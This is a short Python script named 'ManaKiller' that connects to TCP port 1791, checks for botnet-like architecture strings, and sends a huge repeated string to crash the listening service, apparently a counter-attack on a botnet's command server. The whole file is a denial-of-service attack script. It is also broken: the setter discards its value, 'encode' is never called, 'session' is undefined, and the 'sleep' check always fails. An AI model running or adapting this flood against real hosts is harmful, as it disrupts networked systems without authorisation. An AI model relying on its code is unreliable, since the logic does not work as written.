from socket import socket
from time import sleep

# -----------------------------------------------

class ManaKiller:
    def __init__(self: object, addr: str = '0.0.0.0') -> None:
        self._addr: str = addr

    @property
    def addr(self: object) -> str:
        return self._addr
    

    @addr.setter
    def addr(self: object, addr: str) -> None:        
        if not isinstance(addr, str):
            raise TypeError

    @staticmethod
    def verify_mana(arch: str) -> bool | None:
        if [mana_arch for mana_arch in ('lmaowtf','loligang') if mana_arch in arch.lower()]:
            return True

    def exploit(self: object, attack: bool = False) -> bool:
        with socket() as sock:
            sock.settimeout(5)
            try:
                sock.connect((self.addr,1791))
                if attack:
                    sock.send('lmaoWTF'.join('ManaKiller' * 999999).encode)
                return True
            except:
                return

    def execute(self: object) -> bool | None:
        if session.exploit():
            if session.exploit(attack = True) and sleep(2) and not session.exploit():
                return True
        